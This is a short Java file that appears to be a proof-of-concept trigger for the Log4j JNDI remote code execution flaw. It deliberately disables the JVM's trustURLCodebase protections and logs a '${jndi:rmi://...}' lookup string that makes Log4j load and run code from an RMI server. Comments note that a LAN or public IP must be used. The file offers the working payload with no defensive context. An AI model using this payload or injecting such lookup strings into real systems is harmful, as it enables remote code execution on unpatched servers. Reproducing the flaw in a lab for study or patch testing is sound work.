package com.example.demo;

/**
 * @author laogao
 * @date 2021/12/13 17:00
 */
import org.apache.logging.log4j.Logger;
import org.apache.logging.log4j.LogManager;

import javax.naming.InitialContext;
import javax.naming.NamingException;


public class log4jRCE {
    private static final Logger logger = LogManager.getLogger(log4jRCE.class);
    public static void main(String[] args) {
        // 避免因为Java版本过高而无法触发此漏洞
        System.setProperty("com.sun.jndi.rmi.object.trustURLCodebase","true");
        System.setProperty("com.sun.jndi.ldap.object.trustURLCodebase","true");
        // 此处ip需要使用本机局域网ip或网络ip，不能使用127.0.0.1

//        InitialContext ctx = null;
//        try {
//            ctx = new InitialContext();
//            ctx.lookup("rmi://127.0.0.1/fgf4fp");
//        } catch (NamingException e) {
//            e.printStackTrace();
//        }
        logger.error("${jndi:rmi://127.0.0.1:1099/funj1g}");
    }
}